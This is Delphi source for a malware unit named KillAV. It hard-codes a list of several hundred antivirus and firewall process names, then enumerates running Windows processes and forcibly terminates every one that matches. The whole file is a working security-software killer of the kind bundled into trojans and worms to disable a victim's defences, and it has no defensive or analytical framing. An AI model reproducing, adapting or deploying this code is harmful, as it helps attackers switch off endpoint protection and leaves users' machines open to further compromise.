UNIT KillAV;

INTERFACE

USES
  Utils, ACLUtils;

PROCEDURE AVKiller;

VAR
  NumOfAVNames : WORD;
  AVName       : ARRAY [1..500] OF pChar;

CONST
  TAVName : pChar =
    'AGENTW.EXE,ACKWIN32.EXE,CLAW95.EXE,MONITOR.EXE,AVPM.EXE,EVPN.EXE,'+
    'AVP32.EXE,F-STOPW.EXE,APVXDWIN.EXE,PAVPROXY.EXE,VBCONS.EXE,FSM32,'+
    '_AVPCC.EXE,GBPOLL.EXE,TAUMON.EXE,ZONEALARM.EXE,VSMON.EXE,AVKSERV,'+
    'PERSWF.EXE,MPFAGENT.EXE,MPFSERVICE.EXE,MPFTRAY.EXE,PORTMONITOR.EXE,'+
    'CPDCLNT.EXE,VSHWIN32.EXE,VSECOMR.EXE,WEBSCANX.EXE,VSSTAT.EXE,TCM,'+
    'CPD.EXE,ALOGSERV.EXE,CMGRDIAN.EXE,RULAUNCH.EXE,VSMAIN.EXE,GBPOLL,'+
    'CPDCLNT.EXE,CFGWIZ.EXE,IAMAPP.EXE,FRW.EXE,WRCTRL.EXE,WRADMIN.EXE,'+
    'SPHINX.EXE,BLACKICE.EXE,BLACKD.EXE,RAPAPP.EXE,IAMAPP.EXE,AVGCTRL,'+
    'NISUM.EXE,IAMSTATS.EXE,LUSPT.EXE,CCAPP.EXE,CCEVTMGR.EXE,WIMMUN32,'+
    'NISSERV.EXE,AUTODOWN.EXE,VET32.EXE,MWATCH.EXE,EFPEADM.EXE,FSGK32,'+
    'CLEANER3.EXE,CLEANER.EXE,NAVW32.EXE,AVXMONITOR9X.EXE,TC,ICSUPPNT,'+
    'AVXQUAR.EXE,NORMIST.EXE,NVC95.EXE,NUPGRADE.EXE,AVGCC32.EXE,FCH32,'+
    'AVGCTRL.EXE,AVGSERV.EXE,ICLOADNT.EXE,IOMON98.EXE,VET95.EXE,FIH32,'+
    'AUTODOWN.EXE,RESCUE.EXE,WRADMIN.EXE,GUARD.EXE,DOORS.EXE,AVGSERV9,'+
    'PCCIOMON.EXE,AVKSERV.EXE,MINILOG.EXE,VSMON.EXE,BLACKD.EXE,FNRB32,'+
    'NMAIN.EXE,IAMSERV.EXE,GUARDDOG.EXE,PERSFW.EXE,LOCKDOWN.EXE,SPYXX,'+
    'SPHINX.EXE,NPROTECT.EXE,NDD32.EXE,SMC.EXE,NETUTILS.EXE,NTXCONFIG,'+
    'LDNETMON.EXE,CONNECTIONMONITOR.EXE,NVSVC32,AVSYNMGR.EXE,MPFSERVICE,'+
    'NAVENGNAVEX15,NAV AUTO-PROTECT,SYMPROXYSVC.EXE,SWEEPNET,DEFSCANGUI,'+
    'AVSYNMGR,AVGSERV,_AVPM.EXE,AVPM.EXE,AVP.EXE,NAVAPW32.EXE,NAVAP,'+
    'DEFWATCH.EXE,VPC32.EXE,VPTRAY.EXE,POPROXY.EXE,NAVAPSVC.EXE,NTVDM,'+
    'NAVLU32.EXE,NAVWNT.EXE,LUALL.EXE,SWNETSUP.EXE,ICLOAD95.EXE,TDS-3,'+
    'ICMON.EXE,ICSUPP95.EXE,IFACE.EXE,ADVXDWIN.EXE,PADMIN.EXE,RAV7WIN,'+
    'VETTRAY,AUTODOWN,RESCUE,WRCTRL,WRADMIN,GUARD,PCCIOMON,CLAW95,'+
    'NWTOOL16.EXE,NTVDM.EXE,ANTI-TROJAN.EXE,WRCTRL.EXE,TC.EXE,CDP.EXE,'+
    'NAVW32,AVXMONITOR9X,AVXMONITORNT,AVXQUAR,NORMIST,NVC95,CLAW95C,'+
    'TCA.EXE,TCM.EXE,MOOLIVE.EXE,MGHTML.EXE,MCMNHDLR.EXE,MCVSRTE.EXE,'+
    'MGAVRTCL.EXE,MGAVRTE.EXE,SCAN32.EXE,SCRSCAN.EXE,SYMTRAY.EXE,AVPM,'+
    'VSCHED.EXE,MCTOOL.EXE,AVXQUAR.EXE.EXE,AMON9X.EXE,AVGW.EXE,SBSERV,'+
    'WEBTRAP.EXE,POP3TRAP.EXE,TDS-3.EXE,SS3EDIT.EXE,JEDI.EXE,APVXDWIN,'+
    'RAV7WIN.EXE,RAV7.EXE,SWEEP95.EXE,MCAGENT.EXE,MCUPDATE.EXE,FSAV32,'+
    'IFACE,ADVXDWIN,PADMIN,NWTOOL16,ANTS,ANTI-TROJAN,TCA,LOCKDOWN,'+
    'AVSCHED32,DEFALERT,CLAW95CF.EXE,ICSUPP95.EXE,LDSCAN,VIR-HELP.EXE,'+
    'SCRSCAN,SYMTRAY,VSCHED,MCTOOL,AVXW,AMON9X,PCCWIN98,ATUPDATER,'+
    'POP3TRAP,SS3EDIT,JEDI,MONITOR,RAV7,SWEEP95,MCAGENT,ZAPRO.EXE,'+
    'LOCKDOWN2000.EXE,CCPXYSVC.EXE,ETRUSTCIPE.EXE,VBCMSERV.EXE,ANTS.EXE,'+
    'PCCWIN97.EXE,PCCNTMON.EXE,PCSCAN.EXE,NUI.EXE,CLAW95.EXE,AVKWCTL9,'+
    'MCUPDATE,NTRTSCAN,PCCWIN97,PCCNTMON,PCSCAN,NUI,CLAW95CF,AVGW,'+
    'AVKPOP,AVKSERVICE,VETTRAY.EXE,NTRTSCAN.EXE,ETRUSTCIPE.EXE,VPTRAY,'+
    'EXPERT,FP-WIN,F-STOPW,VIR-HELP,F-PROT,ATWATCH,DOORS,NAVAPSVC,'+
    'CLAW95CF.EXE,VET95.EXE,VETTRAY.EXE,AUTODOWN.EXE,VET32.EXE,GBMENU,'+
    'FSAA,FSMA32,FSMB32,MCVSSHLD.EXE,PCCWIN98.EXE,MONITOR.EXE,LUALL,'+
    'MWATCH.EXE,EFPEADM.EXE,EVPN.EXE,RESCUE.EXE,ACKWIN32.EXE,PAVPROXY,'+
    'AVXMONITORNT.EXE,SWEEPSRV.SYS,_AVP32.EXE,AVCONSOL.EXE,ICSUPPNT.EXE,'+
    'PVIEW95,WGFE95,CTRL,LDPROMENU,GENERICS,PROCESSMONITOR,AVXW.EXE,'+
    'DVP95_0.EXE,F-PROT95.EX,EXPERT.EXE,P-WIN.EXE,F-STOPW.EXE,FAMEH32,'+
    'NAVW32,NAVWNT,NPSSVC,SWNETSUP,ICLOAD95,ICMON,ICSUPP95,SCAN32,'+
    'MOOLIVE,MGHTML,MCMNHDLR,MCVSRTE,MGAVRTCL,MGAVRTE,AUTOTRACE.EXE,'+
    'F-PROT.EXE,SPYXX.EXE,ATWATCH.EXE,ATUPDATER.EXE,ATCON.EXE,WEBTRAP,'+
    'PROGRAMAUDITOR,TFAK,LUCOMSERVER,AUTOTRACE,NWSERVICE,NOTSTART.EXE,'+
    'NEOWATCHLOG,NSCHED32,WATCHDOG,ISRV95,REALMON,AVWINNT,DVP95.EXE,'+
    'BLACKD,IAMAPP,NISSERV,NISUM,IAMSTATS,LUSPT,NAVAPW32,CCEVTMGR,'+
    'VSECOMR,WEBSCANX,AVCONSOL,VSSTAT,CPD,ALOGSERV,CMGRDIAN,AVP32,'+
    'AVGCC32,AVGCTRL,AVGSERV,ICSUPP95,ICLOADNT,IOMON98,VET95,CPD,'+
    'ACKWIN32,CLAW95,VSHWIN32,F-STOPW,APVXDWIN,PAVPROXY,VSMON,SMC,'+
    'VBCMSERV,_AVPCC,GBPOLL,TAUMON,ZONEALARM,ZAPRO,PERSWF,NAVLU32,'+
    'PVIEW95.EXE,WGFE95.EXE,CTRL.EXE,LDSCAN.EXE,GENERICS.EXE,MCVSSHLD,'+
    'FNRB32.EXE,FSAA.EXE,FSGK32.EXE,FSM32.EXE,FSMA32.EXE,FSMB32.EXE,'+
    'DEFSCANGUI.EXE,NAVAPSVC.EXE,DEFALERT.EXE,NPSCHECK.EXE,SMC,VBCONS,'+
    'NOTSTART,AVSYNMGR,MINILOG,BLACKD,NMAIN,IAMSERV,PERSFW,RESCUE,'+
    'LOCKDOWN2000,SPHINX,NPROTECT,NETUTILS,LDNETMON,PORTMONITOR,CDP,'+
    'CONNECTIONMONITOR,SYMPROXYSVC,_AVP32,_AVPM,AVPCC,AVP,NUPGRADE,'+
    'PROCESSMONITOR.EXE,TFAK.EXE,LUCOMSERVER.EXE,WIMMUN32.EXE,VSHWIN32,'+
    'IAMAPP,IAMSERV,FRW,WRCTRL,WRADMIN,LOCKDOWN2000,SPHINX,VSMAIN,'+
    'NAVAPW32,RTVSCN95,DEFWATCH,POPROXY,ALERTSVC,VPC32,AVPM,NDD32,'+
    'NWSERVICE.EXE,NTXCONFIG.EXE,NEOWATCHLOG.EXE,NSCHED32.EXE,F-PROT95,'+
    'ISRV95.EXE,REALMON.EXE,AVWINNT.EXE,AVGSERV9.EXE,AVKPOP.EXE,ATCON,'+
    'MWATCH,EFPEADM,CLEANER3,CLEANER,VET95,VETTRAY,ACKWIN32,DVP95,'+
    'AVKWCTL9.EXE,FSAV32.EXE,FAMEH32.EXE,FCH32.EXE,FIH32.EXE,ALOGSERV,'+
    'APVXDWIN.EXE,GBPOLL.EXE,GBMENU.EXE,PAVPROXY.EXE,AVGCTRL.EXE,EVPN,'+
    'AVSCHED32.EXE,AVKSERVICE.EXE,RULAUNCH,GUARDDOG,AVSYNMGR,CMGRDIAN,'+
    'CPDCLNT,CFGWIZ,VET32,BLACKICE,AUTODOWN,ETRUSTCIPE,MCSHIELD.EXE,'+
    'RTVSCN95.EXE,F-AGNT95.EXE,LOCKDOWN2000.EXE,MONITOR,LDPROMENU.EXE,'+
    'DVP95_0,F-AGNT95,WATCHDOG.EXE,SBSERV.EXE,ALOGSERV.EXE,NPSSVC.EXE,'+
    'ALERTSVC.EXE,LDPROMENU.EXE,PROGRAMAUDITOR.EXE,';

IMPLEMENTATION

PROCEDURE InitAvKiller; //Extract file names from pChar
VAR
  I : WORD;
  B : WORD;
  S : STRING;
BEGIN
  S:=TAVName;
  I:=1;
  REPEAT
    B:=Pos(',',S);
    AVName[I]:=pChar(Copy(S,1,B-1));
    Delete(S,1,B);
    Inc(I);
  UNTIL Length(S)=0;
  NumOfAVNames:=I-1;
END;

PROCEDURE AVKiller;
VAR
  ContinueLoop    : BOOL;
  FSnapshotHandle : THandle;
  FProcessEntry32 : TProcessEntry32;
  I               : WORD;
BEGIN
  FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
  ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
  WHILE ContinueLoop DO BEGIN
    FOR I:=1 TO NumOfAVNames DO
      IF ((UpperCase(ExtractFileName(STRING(FProcessEntry32.szExeFile)))=AVName[I])
        OR(UpperCase(FProcessEntry32.szExeFile)=AVName[I])) THEN
          TerminateProcess(OpenProcess(1,False,FProcessEntry32.th32ProcessID),0);
    ContinueLoop:=Process32Next(FSnapshotHandle,FProcessEntry32);
  END;
  CloseHandle(FSnapshotHandle);
END;

END.
